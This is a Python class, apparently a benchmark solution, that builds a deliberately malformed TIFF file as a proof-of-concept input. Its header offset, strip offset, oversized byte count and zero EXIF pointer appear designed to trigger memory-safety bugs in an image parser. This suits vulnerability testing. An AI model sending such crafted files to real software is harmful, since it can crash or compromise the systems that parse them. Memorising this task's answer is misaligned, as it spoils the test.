class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x49\x49\x2a\x00\x00\x00\x00\x0c\x00\x00\x00\x00'
        num_tags = b'\x0c\x00'
        poc += num_tags
        tags_list = [
            (254, 4, 1, 0),
            (256, 4, 1, 100),
            (257, 4, 1, 100),
            (258, 3, 1, 8),
            (259, 3, 1, 1),
            (262, 3, 1, 1),
            (273, 4, 1, 162),
            (277, 3, 1, 1),
            (278, 4, 1, 100),
            (279, 4, 1, 10000),
            (284, 3, 1, 1),
            (34665, 4, 1, 0)
        ]
        for tagid, typ, cnt, val in tags_list:
            t = tagid.to_bytes(2, 'little')
            ty = typ.to_bytes(2, 'little')
            c = cnt.to_bytes(4, 'little')
            v = val.to_bytes(4, 'little')
            poc += t + ty + c + v
        poc += b'\x00\x00\x00\x00'
        return poc
